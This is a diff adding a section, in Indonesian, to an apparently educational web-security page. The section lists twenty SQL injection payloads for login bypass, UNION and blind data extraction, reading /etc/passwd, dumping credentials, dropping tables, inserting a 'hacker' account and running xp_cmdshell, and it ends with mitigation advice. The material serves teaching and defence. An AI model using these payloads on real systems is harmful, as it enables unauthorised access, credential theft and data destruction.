@@ -312,6 +312,64 @@ $stmt->execute([$username, $password]);</code>
             </div>
         </section>
 
+        <!-- Common SQL Injection -->
+        <section class="content-card">
+            <h2 class="section-title">Common SQL Injection: 20 Contoh Kasus</h2>
+            
+            <h3 class="text-success mb-3">A. Authentication Bypass</h3>
+            <div class="code-block">
+                <button class="copy-btn"><i class="fas fa-copy"></i></button>
+                <code>1. ' OR '1'='1
+2. ' OR '1'='1'--
+3. ' OR '1'='1'#
+4. ' OR 'x'='x
+5. admin'--</code>
+            </div>
+            <p>Teknik ini digunakan untuk melewati autentikasi login dengan memanipulasi logika query. Dampak: Akses tidak sah ke akun pengguna.</p>
+
+            <h3 class="text-success mb-3">B. Data Extraction</h3>
+            <div class="code-block">
+                <button class="copy-btn"><i class="fas fa-copy"></i></button>
+                <code>6. ' UNION SELECT null,database()--
+7. ' UNION SELECT null,table_name FROM information_schema.tables--
+8. ' UNION SELECT null,column_name FROM information_schema.columns--
+9. ' UNION SELECT null,concat(username,':',password) FROM users--
+10. ' AND 1=0 UNION SELECT null,load_file('/etc/passwd')--</code>
+            </div>
+            <p>Teknik untuk mengekstrak data sensitif dari database. Dampak: Kebocoran data penting.</p>
+
+            <h3 class="text-success mb-3">C. Blind SQL Injection</h3>
+            <div class="code-block">
+                <button class="copy-btn"><i class="fas fa-copy"></i></button>
+                <code>11. ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--
+12. ' AND IF((SELECT password FROM users WHERE id=1)='admin',SLEEP(5),0)--
+13. ' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1)>50--
+14. ' AND (SELECT COUNT(*) FROM users)>5--
+15. ' AND (SELECT LENGTH(password) FROM users WHERE id=1)=32--</code>
+            </div>
+            <p>Teknik untuk mendapatkan informasi melalui respon boolean atau waktu. Dampak: Pencurian data secara bertahap.</p>
+
+            <h3 class="text-success mb-3">D. Database Manipulation</h3>
+            <div class="code-block">
+                <button class="copy-btn"><i class="fas fa-copy"></i></button>
+                <code>16. '; DROP TABLE users--
+17. '; UPDATE users SET password='hacked' WHERE id=1--
+18. '; INSERT INTO users (username,password) VALUES ('hacker','pwned')--
+19. '; ALTER TABLE users ADD COLUMN backdoor text--
+20. '; EXEC xp_cmdshell 'net user'--</code>
+            </div>
+            <p>Teknik untuk memanipulasi struktur dan data database. Dampak: Kerusakan atau modifikasi data.</p>
+
+            <h3 class="text-success mb-3">Mitigasi SQL Injection</h3>
+            <ul class="list-group list-group-flush bg-transparent">
+                <li class="list-group-item bg-transparent text-light">✓ Gunakan Prepared Statements untuk semua query</li>
+                <li class="list-group-item bg-transparent text-light">✓ Implementasi WAF dengan rule khusus SQL Injection</li>
+                <li class="list-group-item bg-transparent text-light">✓ Validasi dan sanitasi input menggunakan whitelist</li>
+                <li class="list-group-item bg-transparent text-light">✓ Terapkan principle of least privilege</li>
+                <li class="list-group-item bg-transparent text-light">✓ Regular security audit dan penetration testing</li>
+            </ul>
+        </section>
+
         <!-- Best Practices -->
         <section class="content-card">
             <h2 class="section-title">Best Practices Keamanan Database</h2>
